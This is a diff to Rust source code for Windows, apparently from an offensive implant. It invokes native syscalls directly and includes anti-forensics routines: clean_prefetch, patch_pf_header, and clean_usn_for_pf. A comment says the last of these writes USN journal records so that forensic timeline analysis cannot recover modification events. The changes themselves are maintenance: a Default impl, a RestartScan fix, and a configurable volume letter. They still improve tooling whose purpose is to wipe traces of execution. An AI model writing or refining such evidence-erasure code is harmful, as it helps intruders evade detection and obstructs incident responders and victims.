@@ -158,6 +158,19 @@ struct ObjectAttributes {
     security_quality_of_service: *mut std::ffi::c_void,
 }
 
+impl Default for ObjectAttributes {
+    fn default() -> Self {
+        Self {
+            length: 0,
+            root_directory: std::ptr::null_mut(),
+            object_name: std::ptr::null_mut(),
+            attributes: 0,
+            security_descriptor: std::ptr::null_mut(),
+            security_quality_of_service: std::ptr::null_mut(),
+        }
+    }
+}
+
 impl ObjectAttributes {
     fn new(name: &mut UnicodeString) -> Self {
         Self {
@@ -436,9 +449,17 @@ unsafe fn nt_enumerate_files(
     let mut results = Vec::new();
     let buf_size: usize = 4096;
     let mut buffer = vec![0u8; buf_size];
-    let mut iosb = IoStatusBlock::default();
+    let mut first_call = true;
 
     loop {
+        let mut iosb = IoStatusBlock::default();
+
+        // RestartScan: TRUE (1) on the first call to begin from the
+        // start of the directory, FALSE (0) on subsequent calls to
+        // continue from where the last call left off.
+        let restart_scan: u64 = if first_call { 1 } else { 0 };
+        first_call = false;
+
         let status = nt_syscall::syscall!(
             "NtQueryDirectoryFile",
             dir_handle as u64,
@@ -450,8 +471,8 @@ unsafe fn nt_enumerate_files(
             buf_size as u64,
             1u64,   // FileDirectoryInformation (class = 1)
             0u64,   // ReturnSingleEntry = FALSE
-            0u64,   // FileName (null = first call resumes)
-            0u64,   // RestartScan = FALSE (continue from last)
+            0u64,   // FileName (null = resume)
+            restart_scan, // RestartScan
         )
         .map_err(|e| format!("nt_syscall resolution for NtQueryDirectoryFile: {e}"))?;
 
@@ -898,9 +919,11 @@ fn patch_pf_header(data: &mut [u8], version: u32) -> Result<(), String> {
 /// This reads the USN journal, finds entries for the target file, and
 /// writes USN close records to mark them as closed, preventing forensic
 /// timeline analysis from recovering the modification events.
-unsafe fn clean_usn_for_pf(pf_path: &[u16]) -> Result<(), String> {
-    // Open the volume handle (C:) for USN operations.
-    let volume_path = to_wide("\\??\\C:");
+///
+/// `volume_letter` is the drive letter (e.g. `"C:"`), defaulting to `"C:"`.
+unsafe fn clean_usn_for_pf(pf_path: &[u16], volume_letter: &str) -> Result<(), String> {
+    // Open the volume handle for USN operations.
+    let volume_path = to_wide(&format!("\\??\\{}", volume_letter));
     let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
     let mut obj_name = make_unicode_string(&mut volume_path.clone());
     let mut obj_attrs = ObjectAttributes::new(&mut obj_name);
@@ -1321,7 +1344,7 @@ pub fn clean_prefetch(exe_name: &str) -> Result<String, String> {
 
         // USN journal cleanup.
         if config.clean_usn_journal {
-            if let Err(e) = unsafe { clean_usn_for_pf(&pf_path) } {
+            if let Err(e) = unsafe { clean_usn_for_pf(&pf_path, "C:") } {
                 log::debug!("prefetch: USN cleanup failed for {}: {}", filename, e);
                 // Non-fatal — best effort.
             }
